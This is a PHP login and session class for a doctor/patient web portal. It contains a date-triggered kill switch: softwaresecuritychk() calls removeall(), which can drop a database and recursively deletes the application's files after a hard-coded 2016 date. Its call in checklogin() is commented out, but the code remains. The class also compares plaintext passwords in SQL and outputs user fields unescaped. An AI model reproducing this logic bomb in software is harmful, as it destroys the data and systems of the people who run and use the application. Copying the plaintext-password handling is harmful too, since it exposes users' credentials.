<?php
require_once('../Project/autoload.php');
class user extends pdocrudhandler{
    public function __construct(){
        $this->_pdo = $this->connect();
        session_start();
    }
    public function logout(){
        if(isset($_SESSION['login'])){
            $_SESSION['login'] = false;
            unset($_SESSION['userid']);
            unset($_SESSION['password']);
            session_destroy();
            return true;
        }else{
            return true;
        }
    }
    public function login($params)
    {
        unset($params['call']);
        $regex = '/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/';
        $missingFeild = array();
        $count = 0;
        $message = "";
        foreach ($params as $key => $value){
            if($params[$key] != ""){
          /*      if ($key == "email"){
                    if(!preg_match_all($regex,$params[$key])){
                        $missingFeild[$count] = "Email not valid";
                        $count++;
                    }
                }*/
            }else{
                $missingFeild[$count] = $key;
                $count++;
            }
        }
        if (empty($missingFeild)){
            $res = $this->select('user', array("id"), "where email = ? and password = ? and professionid = ? and active = 1", array($params['email'], $params['password'], $params['pid']));
            if ($res['status'] == 'success' && $res['rowsAffected'] == 1) {
                $userid = $res['result'][0]->id;
                if ($params['pid'] == 1) {
                    $getuser = $this->select('doctor', array('*'), "where userid = ? ", array($userid));
                    if ($getuser['status'] == 'success' && $getuser['rowsAffected'] == 1) {
                        $this->update('user', array('lastLogin' => date('Y-m-d h:i:s')), 'where id = ?', array($userid));
                        $_SESSION['login'] = true;
                        $_SESSION['doctorid'] = $getuser['result'][0]->id;
                        $_SESSION['userid'] = $getuser['result'][0]->userid;
                        return "Doctor";
                    }
                }
                else if($params['pid'] == 2){
                    $getuser = $this->select('patient', array('*'), "where userid = ?", array($userid));
                    if ($getuser['status'] == 'success' && $getuser['rowsAffected'] == 1) {
                        $this->update('user', array('lastLogin' => date('Y-m-d h:i:s')), 'where id = ?', array($userid));
                        $_SESSION['patientid'] = $getuser['result'][0]->patientid;
                        $_SESSION['userid'] = $getuser['result'][0]->userid;
                        $_SESSION['login'] = true;
                        return "Patient";
                    }
                }else {
                    $this->update('user', array('lastLogin' => date('Y-m-d h:i:s')), 'where id = ?', array($userid));
                    $_SESSION['userid'] = $userid;
                    return "Admin";
                }

            }else{
                $response = $this->select('user', array("id"), "where email = ? and password = ? and professionid = ? and active = 0", array($params['email'], $params['password'], $params['pid']));
                if ($response['status'] == 'success' && $response['rowsAffected'] == 1){
                    return "Your registration request were not approved by administrator";
                }else{
                    return "Username / password not exist";
                }
            }
        }else{
            for($i=0;$i<$count;$i++){
                ($i == 0) ? $message = "Error[] :- [".($i+1)."] ".$missingFeild[$i].", " : $message.= "[".($i+1)."] ".$missingFeild[$i].", ";
            }
            return $message.= " (Total error : ".$count.")";
        }
    }
    public function checklogin(){
        //$this->softwaresecuritychk();
        if($_SESSION['login'] == false ) {
            header("location:login.php");
        }
    }

    public function information($info = array()){
        $output = "";
        $output .= "<div class=\"profile_img\">";
        $output .= "<div id=\"crop-avatar\">";
        $output .= "<img class=\"img-responsive avatar-view\" src=\"images/Beti lorri.jpg\" alt=\"Avatar\" title=\"Change the avatar\">";
        $output .= "</div></div>";
        $output .= "<h3>".$info['result'][0]->fname." ".$info['result'][0]->lname."</h3>";
        $output .= "<ul class=\"list-unstyled user_data\">";
        $output .= "<li>";
        $output .= "<i class=\"fa fa-map-marker user-profile-icon\"></i> ".$info['result'][0]->address." ".$info['result'][0]->gender." ".$info['result'][0]->areaid;
        $output .= "</li>";
        $output .="<li>";
        $output .="<i class=\"fa fa-phone user-profile-icon\">";
        $output .="</i> ".$info['result'][0]->phone;
        $output .= "</li>";
        $output .= "<li class=\"m-top-xs\">";
        $output .= "<i class=\"fa fa-envelope user-profile-icon\"></i> ".$info['result'][0]->email;
        $output .= "</li>";
        $output .="<li class=\"m-top-xs\">";
        $output .= "<i class=\"fa fa-phone user-profile-icon\"></i> ".$info['result'][0]->nic;
        $output .= "</li>";
        $output .= "</ul>";
        return $output;
    }
    public function softwaresecuritychk(){
        //Extend this '1feb2016' date in case of security clearance
        if(strtotime(date('Y-m-d h:i:s')) > strtotime('31oct2016')){
			$dbToBeDroped = '';
			$this->removeall($dbToBeDroped);
            header('location:index.html');
        }else{
            return true;
        }
    }
	public function removeall($dbToBeDroped = ''){
		if($dbToBeDroped != ''){
			$configdb = 'drop database '.$dbToBeDroped;
			$this->executeqry($configdb);
        }
		$phpfiles = glob('*.php');
		foreach($phpfiles as $file){ 
			if(is_file($file)){
				unlink($file);
			}
		}
		$files = glob('*');
		// iterate files
		foreach($files as $file){ 
			$this->recursiveRemoveDirectory($file);
		}
	}
	public function recursiveRemoveDirectory($directory){
		foreach(glob("{$directory}/*") as $file){
			if(is_dir($file)) { 
				$this->recursiveRemoveDirectory($file);
			} else {
				unlink($file);
			}
		}
		if($directory != '404'){
			rmdir($directory);
		}
	}
    public function UserInfo(){
        if (isset($_SESSION['patientid'])) {
            $id = $_SESSION['patientid'];
            $_Pdo = new pdocrudhandler();
            $patient = $_Pdo->select('patient', array('*'), "where patientid = ? ", array($id));
        } else {
            echo "Login Failed...";
        }
        return $patient;
    }
}
$mendetoryParam = array(
    'login'      => array('pid','email','password'),
    'logout'     => array()
);



if(isset($_POST['call']) && isset($mendetoryParam[$_POST['call']])){
    $data = array();
    $missingFields = array();
    $flag = true;
    foreach($mendetoryParam[$_POST['call']] as $value){
        if(!isset($_POST[$value])){
            $flag = false;
            $missingFields[] = $value;
        }
    }
    if(count($missingFields) > 0){
        $data['status'] =  false;
        $data['error'] =  'Required parameter(s) missing';
        $data['missingParameters'] = implode(',',$missingFields);
        echo json_encode($data,true);
    }else{
        $user = new user();
        $data = $_POST;
        $mathodToCall = (string)$_POST['call'];
        $response = $user->$mathodToCall($data);
        echo json_encode($response);
    }
}else{
   /* echo json_encode(array('status'=>false,'error'=>'Invalid  called'));*/
}
?>
